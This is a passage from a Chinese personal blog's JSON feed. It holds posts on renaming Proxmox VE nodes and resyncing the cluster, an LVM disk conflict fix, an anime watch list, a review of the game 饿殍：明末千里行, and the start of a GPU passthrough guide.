                "数据库",
                "DevOps"
            ]
        },
        {
            "id": "https://taf.fyi/cs/pve/sync-pve-cluster/",
            "url": "https://taf.fyi/cs/pve/sync-pve-cluster/",
            "title": "PVE更改节点主机名、ip与集群同步",
            "date_published": "2024-08-13T16:00:00.000Z",
            "content_html": "<h1 id=\"更改主机名\"><a class=\"anchor\" href=\"#更改主机名\">#</a> 更改主机名</h1>\n<p>更改主机名的操作和 Debian 基本一致，但是 PVE 中会产生新的问题：</p>\n<ul>\n<li>配置文件需要手动迁移</li>\n<li>如果该节点已加入了集群，集群同步会出问题：\n<ul>\n<li>集群配置文件需要手动更新</li>\n<li>节点之间 ssh 通信问题</li>\n</ul>\n</li>\n<li>Cepth 我在这次还没有配置 Cepth，所以情况未知</li>\n</ul>\n<p>和 Debian 一样的操作：</p>\n<p><figure class=\"highlight bash\"><figcaption><span>bash</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取旧主机名字</span></span><br><span class=\"line\">old_hostname=$(hostname)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 输入新主机名</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;请输入新的主机名:&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">read</span> new_hostname</span><br><span class=\"line\"></span><br><span class=\"line\">sudo sed -i <span class=\"string\">&quot;s/<span class=\"variable\">$old_hostname</span>/<span class=\"variable\">$new_hostname</span>/g&quot;</span> /etc/hosts /etc/hostname /etc/postfix/main.cf</span><br></pre></td></tr></table></figure></p>\n<p>然后需要重启让新主机名生效。重启会可能会同时看到新节点和旧节点，新节点上看不到原来的虚拟机、容器，旧节点上看得到，因为虽然重启创建了  <code>/etc/pve/nodes/$new_hostname/</code>  目录，但是旧节点的配置文件还在  <code>/etc/pve/nodes/$old_hostname/</code>  中。</p>\n<p>其中  <code>/etc/pve/nodes/$old_hostname/qemu-server/</code>  比较特殊，  <code>mv</code>  指令无法将它们直接移动，需要借助 “中转” 移动过去。</p>\n<p><figure class=\"highlight bash\"><figcaption><span>bash</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 输入新主机名</span></span><br><span class=\"line\"><span class=\"built_in\">read</span> old_hostname</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取旧主机名</span></span><br><span class=\"line\">new_hostname=$(hostname)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cp</span> -r /etc/pve/nodes/<span class=\"variable\">$old_hostname</span>/* /etc/pve/nodes/<span class=\"variable\">$new_hostname</span>/</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 中转</span></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> /root/temp</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">mv</span> /etc/pve/nodes/<span class=\"variable\">$old_hostname</span>/qemu-server/* /root/temp/</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cp</span> /root/temp/* /etc/pve/nodes/<span class=\"variable\">$new_hostname</span>/qemu-server/</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">rm</span> -rf /etc/pve/nodes/<span class=\"variable\">$old_hostname</span> /root/temp /root/t.sh</span><br></pre></td></tr></table></figure></p>\n<p>每一个更改主机名的节点，都要单独对其执行如上操作。</p>\n<h1 id=\"更改-ip\"><a class=\"anchor\" href=\"#更改-ip\">#</a> 更改 ip</h1>\n<p>修改  <code>/etc/issue</code></p>\n<p>修改  <code>/etc/hosts</code></p>\n<p>在 PVE 面板中节点的网络（network）修改 ip ，点击应用配置（apply configuration）使其生效</p>\n<p>或者直接修改  <code>etc/network/interfaces</code> ，然后重启网络  <code>systemctl restart networking</code></p>\n<h1 id=\"集群同步\"><a class=\"anchor\" href=\"#集群同步\">#</a> 集群同步</h1>\n<h2 id=\"集群配置文件\"><a class=\"anchor\" href=\"#集群配置文件\">#</a> 集群配置文件</h2>\n<p>按照官方文档，在每一个节点上编辑集群配置文件  <code>/etc/pve/corosync.conf</code>  和  <code>/etc/corosync/corosync.conf</code> （一般重启  <code>corosync</code>  会自动和前者同步），可以修改不同节点主机名、IP、集群 id 等：</p>\n<p><figure class=\"highlight bash\"><figcaption><span>bash</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cp</span> /etc/pve/corosync.conf /etc/pve/corosync.conf.new</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cp</span> /etc/pve/corosync.conf /etc/pve/corosync.conf.bak</span><br><span class=\"line\"></span><br><span class=\"line\">nano /etc/pve/corosync.conf.new</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">mv</span> /etc/pve/corosync.conf.new /etc/pve/corosync.conf</span><br><span class=\"line\"></span><br><span class=\"line\">systemctl restart corosync</span><br></pre></td></tr></table></figure></p>\n<div class=\"note warning\">\n<p>如果修改节点 id，一定注意它是从 1 开始而不是 0 开始的！</p>\n</div>\n<p>这里因为权限问题不能直接编辑，而是创建新文件覆盖的方式编辑。原因如下：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@node3:~# ls -lah /etc/pve/corosync.conf</span><br><span class=\"line\">-rw-r----- 1 root www-data 638 Aug 13 14:36 /etc/pve/corosync.conf</span><br></pre></td></tr></table></figure></p>\n<p>还有另一种方式可以编辑这样的文件，通过切换文件系统的方式。如果上述方法操作失误或编辑出错了，可以通过如下方法挽救：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl stop pve-cluster</span><br><span class=\"line\"></span><br><span class=\"line\">systemctl stop corosync</span><br><span class=\"line\"></span><br><span class=\"line\">pmxcfs -l</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">现在可以编辑任意文件了</span></span><br><span class=\"line\"></span><br><span class=\"line\">nano /etc/pve/corosync.conf</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">恢复</span></span><br><span class=\"line\"></span><br><span class=\"line\">killall pmxcfs</span><br><span class=\"line\"></span><br><span class=\"line\">systemctl start pve-cluster</span><br><span class=\"line\"></span><br><span class=\"line\">systemctl start corosync</span><br></pre></td></tr></table></figure></p>\n<p>此外，若修改了节点的 id，还需要在重启  <code>corosync</code>  前受影响节点上删除旧的 id 信息：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rm -rf /var/lib/corosync/*</span><br></pre></td></tr></table></figure></p>\n<p>编辑好配置文件之后，预期将在面板的  <code>数据中心-&gt;概要; Datacenter(Cluster)-&gt;Summary</code>  看到预期的节点情况。</p>\n<blockquote>\n<p>这个过程由于我参考了官方文档 “从删除集群删除节点” 的内容，我曾误删过  <code>/etc/corosync/authkey</code>  和 ，导致了  <code>systemctl start corosync</code>  失败，查看日志看到  <code>no such file or directory</code>  这样的的报错，可以从其他节点  <code>tcp</code>  等方式拷贝过去解决。</p>\n</blockquote>\n<h2 id=\"ssh-通信\"><a class=\"anchor\" href=\"#ssh-通信\">#</a> ssh 通信</h2>\n<p>修改主机名、ip 后还会导致节点之间的 ssh 通信出问题，登录某一节点 ip 的面板无法访问另一个节点的信息。</p>\n<p>修改  <code>/etc/hosts</code>  增加这些节点和 ip，仍没有解决。</p>\n<p>在每一个节点上对每一个其他节点 nodeX (x.x.x.x) 执行  <code>/usr/bin/ssh -e none -o 'HostKeyAlias=nodeX' root@x.x.x.x /bin/true</code> ，仍没有解决。</p>\n<p>最终解决：</p>\n<p>在每一个节点 nodeX (x.x.x.x) 上，查看  <code>/etc/ssh/ssh_host_rsa_key.pub</code>  得到该节点为 PVE 使用的 rsa 公钥  <code>(pub)xxx...</code> ，然后每一个节点上在集群共享文件  <code>/etc/pve/priv/known_hosts</code>  中编辑确保有且仅有如下信息，删去旧的不正确的信息：</p>\n<p><figure class=\"highlight bash\"><figcaption><span>known_hosts</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">x.x.x.x ssh-rsa (pub)xxx...</span><br><span class=\"line\">nodeX ssh-rsa (pub)xxx...</span><br><span class=\"line\">x.x.x.x ssh-rsa (pub)xxx...</span><br><span class=\"line\">nodeX ssh-rsa (pub)xxx...</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure></p>\n<p>在每一个节点上，建立软链接：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ln -s /etc/pve/priv/known_hosts /etc/ssh/ssh_known_hosts</span><br></pre></td></tr></table></figure></p>\n<p>最后重启  <code>pveproxy</code>  服务：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl restart pveproxy</span><br></pre></td></tr></table></figure></p>\n<script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kity@2.0.4/dist/kity.min.js\"></script><script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js\"></script><script defer=\"true\" type=\"text&#x2F;javascript\" src=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js\"></script><link rel=\"stylesheet\" type=\"text&#x2F;css\" href=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css\">",
            "tags": [
                "计算机科学",
                "PVE",
                "DevOps"
            ]
        },
        {
            "id": "https://taf.fyi/cs/pve/pve-lvm/",
            "url": "https://taf.fyi/cs/pve/pve-lvm/",
            "title": "PVE更换系统盘时的LVM冲突问题",
            "date_published": "2024-07-10T16:00:00.000Z",
            "content_html": "<div class=\"note primary\">\n<p>自我总结：不懂 Linux 导致的，希望以后通过折腾 Arch 好好学习 Linux</p>\n</div>\n<blockquote>\n<p>考完期末考这天修了一晚上 PVE 上的虚拟机启动不了的问题。起因是更换了系统盘，将原来的机械硬盘换成了一个 SSD，重装了 PVE，发现虚拟机无法开机。这期间查询了大量论坛，尝试了各种各样的方法，最后终于以非常简单的方式解决，决定写一写记录一下，避免以后再遇到，因为这个问题单纯看 PVE 的报错竟然是完全和问题原因不沾边的！</p>\n</blockquote>\n<p>更换系统盘前，将虚拟机  <code>vm1</code>  迁移到了另一个节点上，更换系统盘重装系统后，将  <code>vm1</code>  迁移回了这台物理机上，启动虚拟机，得到了如下报错：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">TASK ERROR: KVM virtualisation configured, but not available. Either disable in VM configuration or enable in BIOS.</span><br></pre></td></tr></table></figure></p>\n<p>按照报错的指引，进入 BIOS 查看了设置，设置是正确的，有启用虚拟化支持。</p>\n<p>然后在网络上查询了大量资料、论坛讨论记录，均无法解决。这个过程尝试了包括：</p>\n<ul>\n<li>\n<p><code>apt upgrade</code>  升级</p>\n</li>\n<li>\n<p>开新虚拟机</p>\n</li>\n<li>\n<p>重装系统（PVE）</p>\n</li>\n<li>\n<p>在虚拟机  <code>Option</code>  中取消  <code>KVM hardware Virtualization</code>  的启用，这样就没有使用 KVM 技术，虚拟机性能是会更差的。但是启动  <code>vm1</code>  发现虚拟机一直重启，对新虚拟机是有如下报错：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Error: Unknown device type.</span><br><span class=\"line\">can&#x27;t create interface fwln306i0 - command &#x27;/sbin/ip link add name fwln306i0 mtu 1500 type veth peer name fwpr306p0 mtu 1500&#x27; failed: exit code 2</span><br><span class=\"line\"></span><br><span class=\"line\">kvm: -netdev type=tap,id=net0,ifname=tap306i0,script=/var/lib/qemu-server/pve-bridge,downscript=/var/lib/qemu-server/pve-bridgedown: network script /var/lib/qemu-server/pve-bridge failed with status 512</span><br><span class=\"line\">TASK ERROR: start failed: QEMU exited with code 1</span><br></pre></td></tr></table></figure></p>\n</li>\n</ul>\n<p>上述方法都没有解决问题。</p>\n<p>真正发现问题原因是我在查看 BIOS 和重装系统后，发现每次开机启动 PVE 都有这样的报错：</p>\n<p><img data-src=\"/assets/cs/pve/pve-switch-sysdisk/PVE%E5%BC%80%E6%9C%BA%E6%8A%A5%E9%94%99.jpg\" alt=\"PVE开机报错\" /></p>\n<p>经过询问大佬，才知道，我们更换系统盘后，由于仍想利用旧的机械硬盘，机械盘仍然插在物理机上。拔掉旧的盘之后问题就解决了。</p>\n<p>PVE 采用 LVM，产生了逻辑卷冲突，导致了上图的报错，至于为什么会有什么关于虚拟化的报错，我们就不太清楚了，但是因为这个奇怪的报错我们浪费了两三个小时......</p>\n<script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kity@2.0.4/dist/kity.min.js\"></script><script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js\"></script><script defer=\"true\" type=\"text&#x2F;javascript\" src=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js\"></script><link rel=\"stylesheet\" type=\"text&#x2F;css\" href=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css\">",
            "tags": [
                "计算机科学",
                "PVE",
                "DevOps"
            ]
        },
        {
            "id": "https://taf.fyi/acgn/anime-log/",
            "url": "https://taf.fyi/acgn/anime-log/",
            "title": "看番记录表",
            "date_published": "2024-05-26T16:00:00.000Z",
            "content_html": "<div class=\"note primary\">\n<p><code>*</code>  星号是没完全看完，正在持续更新中......</p>\n</div>\n<h1 id=\"2023\"><a class=\"anchor\" href=\"#2023\">#</a> 2023</h1>\n<h2 id=\"寒假\"><a class=\"anchor\" href=\"#寒假\">#</a> 寒假：</h2>\n<ul>\n<li>EVA 旧版</li>\n<li>凉宫春日</li>\n<li>Angel Beats!</li>\n<li>Little Busters</li>\n<li>Air</li>\n<li>86 - 不存在的战区</li>\n<li>ISLAND</li>\n<li>斩赤红之瞳</li>\n<li>可塑性记忆</li>\n<li>虚构推理</li>\n<li>冰海战记</li>\n<li>魔圆</li>\n<li>魔纪</li>\n<li>想要成为影之实力者</li>\n</ul>\n<h3 id=\"一些短的\"><a class=\"anchor\" href=\"#一些短的\">#</a> 一些短的：</h3>\n<ul>\n<li>快要坏掉的八音盒</li>\n<li>星之梦 + 星之人</li>\n</ul>\n<h2 id=\"大一下\"><a class=\"anchor\" href=\"#大一下\">#</a> 大一下：</h2>\n<ul>\n<li>Canon *</li>\n<li>时光沙漏</li>\n<li>安达与岛村</li>\n<li>终将成为你</li>\n<li>天国大魔境</li>\n</ul>\n<h2 id=\"暑假\"><a class=\"anchor\" href=\"#暑假\">#</a> 暑假：</h2>\n<ul>\n<li>处刑少女的生存手册</li>\n<li>Happy Sugar Life</li>\n</ul>\n<h2 id=\"大二上\"><a class=\"anchor\" href=\"#大二上\">#</a> 大二上：</h2>\n<ul>\n<li>mygo *</li>\n<li>黑之契约者 *</li>\n<li>Fate Zero</li>\n</ul>\n<h1 id=\"2024\"><a class=\"anchor\" href=\"#2024\">#</a> 2024</h1>\n<h2 id=\"寒假-2\"><a class=\"anchor\" href=\"#寒假-2\">#</a> 寒假</h2>\n<ul>\n<li>死亡笔记</li>\n</ul>\n<h2 id=\"暑假-2\"><a class=\"anchor\" href=\"#暑假-2\">#</a> 暑假</h2>\n<ul>\n<li>终末列车去往何方</li>\n<li>神不在的星期天</li>\n<li>Another</li>\n<li>尸体派对</li>\n<li>死后文</li>\n<li>无职转生</li>\n<li>为美好的世界献上祝福 + 爆炎</li>\n<li>魔法少女网站</li>\n<li>魔法少女育成计划</li>\n</ul>\n<h2 id=\"大三上\"><a class=\"anchor\" href=\"#大三上\">#</a> 大三上</h2>\n<ul>\n<li>RE0</li>\n<li>甲铁城的卡巴内瑞</li>\n<li>极黑的布伦希尔德</li>\n</ul>\n<script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kity@2.0.4/dist/kity.min.js\"></script><script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js\"></script><script defer=\"true\" type=\"text&#x2F;javascript\" src=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js\"></script><link rel=\"stylesheet\" type=\"text&#x2F;css\" href=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css\">",
            "tags": [
                "ACGN"
            ]
        },
        {
            "id": "https://taf.fyi/acgn/epiao/",
            "url": "https://taf.fyi/acgn/epiao/",
            "title": "《饿殍：明末千里行》通关记录",
            "date_published": "2024-05-26T16:00:00.000Z",
            "content_html": "<blockquote>\n<p>今天因为校青马班的活动又跑到南校开会、参观团一大。中涂我也不能用电脑，于是无聊之际，手机打开了一直感兴趣的《饿殍：明末千里行》的游戏录播，看了前面就上头了。于是一直到凌晨 3 点，打完了 2 个 TE ，非常有感触，于是一边听着 ED 写下本篇文章作记录。（即使第二天有早八我也不管了！）</p>\n</blockquote>\n<p>这是我玩的第二篇国产的国产文字冒险游戏。（上一部是《OPUS: 龙脉长歌》，这两部观感都非常好）《饿殍》难怪这么火，是有些原因的：</p>\n<ul>\n<li>首先作为一个全年龄向的游戏，受众确实更加广泛</li>\n<li>人物立绘、CG 也是蛮出色的</li>\n<li>而且描写的饥荒惨状，敢于如此露骨地描写、刻画，也是非常值得称赞的。有些东西，一定要最露骨的刻画，才能真正描绘出来，传达出来</li>\n<li>当然也有一些比较出圈的 “名场面”，懂得都懂了</li>\n<li>音乐方面并不十分特别，但也不错</li>\n</ul>\n<p>我尤其比较喜欢的，还得是双线叙事处理穗的回忆了。穗的回忆可以说是最压抑的部分，在回忆的开头，展现了一点穗原本家庭的美好画面，但后面便开始逐渐步入绝望，令人揪心。尤其是《绝望》这一篇，最为压抑，也最为强而有力，直击玩家的心扉！</p>\n<p>这部作品的描绘，很有 “中国” 的历史特色，最后也展现了 “反叛” 这样的末代王朝常见的主旋律。与日系作品相比，少了一分细腻，但却传达了与 “物哀” 一样的悲剧的美。</p>\n<p>要说从这作品思考到了什么，倒也没有什么。对我来说，我想也是对于大部分和我一样的观众来说，这样的作品给我们的，更多的是摆脱平常朝九晚五、三点一线生活的一点调味。相比平静的青春校园主题作品，这样的乱世、在乱世中旅行、在乱世中寻仇的题材，更给人刺激感、新鲜感。</p>\n<p><img data-src=\"/assets/acgn/epiao/1.jpg\" alt=\"1\" /></p>\n<p>穗这个角色，塑造的相当好。她给人一种 “小大人” 的感觉，但是这些成熟、懂事、机灵等等不符合其年龄的特点，都反衬着她的艰辛遭遇，都令人心酸。在穗的回忆中，她反而是没有那么 “懂事” 的，还会因为父母煮了小猫而赌气。这样的前后对照，也是对她悲惨遭遇的深层次的刻画，饥荒的灾难不仅摧残她的身体，更塑造了她的性格，催生了她的成长。</p>\n<p>而一路上，玩家要想达到好结局，必须要做的只有一件事：尽量在穗面前表现得善良一些，增加所谓的 “好感度”。这也是和传统的文字冒险游戏选项分支不太一样，从这里实际上也看出了游戏的一大主题：原谅。玩家的最终目标，或者说主人公良的终极目标，就是获取穗的原谅。不得不说这还是蛮反差的，因为穗的回忆中，淋漓尽致地描写了良杀害了穗爹爹后，穗家庭的更加惨不忍睹的悲剧，而玩家在见识到这一切之后，还要去替这个 “罪魁祸首” 寻求原谅。</p>\n<p>确实，这也是很多人会排斥、难以接受的地方。把穗一家害得如此惨的弑父仇敌，凭什么要原谅？</p>\n<p>当然，游戏制作者还是 “上价值”，提醒了玩家们，罪魁祸首不是良，不是男主，而是荒淫无道的王爷、朝廷官府，这也是为什么这个游戏这么有 “中国” 的历史特色，原来一切都是人压迫人导致的悲剧。</p>\n<p><img data-src=\"/assets/acgn/epiao/2.jpg\" alt=\"2\" /></p>\n<p>整个作品描绘的是一个悲剧、一幅惨状、一对命运不幸的主人公。</p>\n<p>穗的人生，自从家里只剩她自己之后，就总是在围绕着 “为了复仇而活着” 了。</p>\n<p>良的人生，自从父亲去世只剩他一个人之后，直到遇到穗之前，总是围绕着 “为自己而活着”。</p>\n<p>两个角色也就是这样，有一种恰到好处的 “距离感”，看似合作伙伴，实则杀父仇人，在相互帮助、依赖的过程中，产生了一点点的、非常少的 “为对方而活着” 的感觉。而尤其是到了 TE “同生” ，“为对方而活着” 的感觉就更强烈了。</p>\n<p>贯穿整个故事的，一直都是两人这样的 “距离感”。在 TE 之前的 3 个结局，突出表现了距离感与陌生感：</p>\n<ul>\n<li>无言，穗实施了计划让良在茫然、错愕中被捕、处以极刑，可以说是最不好的结局之一</li>\n<li>快逃，和无言的区别在于穗给了良准备的机会，给了良体面赴死的机会</li>\n<li>不见，最让人放不下的结局\n<ul>\n<li>穗的想法来看，可以有两种解读：\n<ul>\n<li>可以认为穗似乎原谅良了，不再杀良，宁可自己一人消失</li>\n<li>可以认为穗依然复仇了，只是她的复仇，不再是设计良被捕，而是用自己的消失、荷包的提醒，告诉良真相之后一言不发地独自消失</li>\n</ul>\n</li>\n<li>穗的去向来看，也有两种解读：\n<ul>\n<li>很大可能，穗投湖自尽了，在失去 “复仇” 这一人生意义后，只好自杀</li>\n<li>很小的概率，穗或许伪造了投湖的迹象，依然活着，并且选择不再出现在良眼前</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p>那张惊艳无比的烟花的 CG ，竟是良和穗的最后一面。而后，穗谎称解手，便一去不返，突然没了音讯。两人再次拉开了距离，突然一股陌生感、寂寞感向玩家袭来。</p>\n<p>至此，穗这个角色的塑造堪称饱满，她不再是弱小无力的” 小羊 “，而是和良站在平等的位置上的，甚至站在审判良的位置上的，一个饱满的角色。并且，一直保持了一份 “距离感”，即穗与良的 “距离感”，也是玩家与” 穗 “这个角色的” 距离感 “，是不再相见的 “距离感”、是弑父血仇的 “距离感”、是生与死的” 距离感 “。</p>\n<p>直到最后的结局 “同生” 也是，一直保留了这份若即若离的距离感，两人还是以仇人相称。这份 “距离感”，比皆大欢喜、甜甜蜜蜜发糖可要好太多了，这也是我非常喜欢的结局。</p>\n<table>\n<thead>\n<tr>\n<th>片段一 (同生)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>良 [喂，我算了一下，如今你大概二十有三了吧。]</td>\n</tr>\n<tr>\n<td>满穗 [嗯。]</td>\n</tr>\n<tr>\n<td>良 [现在嫁人了没？]</td>\n</tr>\n<tr>\n<td>满穗 [没嫁呢。]</td>\n</tr>\n<tr>\n<td>良 [哦。]</td>\n</tr>\n<tr>\n<td>满穗 [良呢？打仗的候娶妻了吗？]</td>\n</tr>\n<tr>\n<td>良 [没娶，兵荒乱的，娶什么妻。]</td>\n</tr>\n<tr>\n<td>满穗 [也是。]</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th>片段二 (同生)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>满穗 [其实，这么多年来，我跟别人提起我的名字，一直都是 “穗”。]</td>\n</tr>\n<tr>\n<td>满穗 [唯独良爷，我说了全名，是叫满穗。]</td>\n</tr>\n<tr>\n<td>良 [......]</td>\n</tr>\n<tr>\n<td>良 [哦？为何只有我有这个区别？]</td>\n</tr>\n<tr>\n<td>满穗 [呵...... 当初我就是觉得，要仇人知道我的全名，我才没有白复仇。]</td>\n</tr>\n<tr>\n<td>满穗 [如今怎么想的，我也不知道了......]</td>\n</tr>\n<tr>\n<td>良 [......]</td>\n</tr>\n<tr>\n<td>满穗 [......]</td>\n</tr>\n<tr>\n<td>良 [......]</td>\n</tr>\n<tr>\n<td>满穗 [话说回来，良爷觉得怎么样？]</td>\n</tr>\n<tr>\n<td>良 [什么怎么样？]</td>\n</tr>\n<tr>\n<td>满穗 [你喜欢 “满穗”，还是 “穗”？]</td>\n</tr>\n<tr>\n<td>良 [......]</td>\n</tr>\n<tr>\n<td>满穗 [......]</td>\n</tr>\n<tr>\n<td>良 [......]</td>\n</tr>\n<tr>\n<td>良 [“满穗” 吧]</td>\n</tr>\n<tr>\n<td>满穗 [......]</td>\n</tr>\n<tr>\n<td>良 [我喜欢 “满穗”......]</td>\n</tr>\n<tr>\n<td>满穗 [哦......]</td>\n</tr>\n<tr>\n<td>良 [满穗、满穗、满穗......]</td>\n</tr>\n<tr>\n<td>我念了一遍又一遍她的名字。</td>\n</tr>\n<tr>\n<td>满穗 [......]</td>\n</tr>\n<tr>\n<td>她没有说话，只是装著听不见我在念她的名字</td>\n</tr>\n<tr>\n<td>她特不时地整笑著，不知在高兴些什么</td>\n</tr>\n<tr>\n<td>她望著窗外，饮著茶，似乎在想著一些什么......</td>\n</tr>\n<tr>\n<td>—— 咕</td>\n</tr>\n<tr>\n<td>我也饮下了一杯茶，望著她所眺望的方向，嘴角不自地勾起了一丝笑意。</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th>片段三 (共死)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>满穗 [以前... 我装成哑巴... 现在... 你真成哑巴了... 真好笑...]</td>\n</tr>\n<tr>\n<td>她轻声笑着</td>\n</tr>\n<tr>\n<td>满穗 [良，抱紧我吧......]</td>\n</tr>\n</tbody>\n</table>\n<script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kity@2.0.4/dist/kity.min.js\"></script><script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js\"></script><script defer=\"true\" type=\"text&#x2F;javascript\" src=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js\"></script><link rel=\"stylesheet\" type=\"text&#x2F;css\" href=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css\">",
            "tags": [
                "ACGN"
            ]
        },
        {
            "id": "https://taf.fyi/cs/pve/pve-passthrough-gpu/",
            "url": "https://taf.fyi/cs/pve/pve-passthrough-gpu/",
            "title": "PVE直通显卡",
            "date_published": "2024-05-06T16:00:00.000Z",
            "content_html": "<blockquote>\n<p>PVE 版本：8.1.4 ，显卡：NVIDIA GTX 745</p>\n</blockquote>\n<h1 id=\"宿主机配置\"><a class=\"anchor\" href=\"#宿主机配置\">#</a> 宿主机配置</h1>\n<h2 id=\"iommu\"><a class=\"anchor\" href=\"#iommu\">#</a> IOMMU</h2>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nano /etc/default/grub</span><br></pre></td></tr></table></figure></p>\n<p>将  <code>GRUB_CMDLINE_LINUX_DEFAULT=&quot;...&quot;</code>  中的内容修改为如下：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet intel_iommu=on iommu=pt video=efifb:off&quot;</span><br></pre></td></tr></table></figure></p>\n<p>准确来说是在  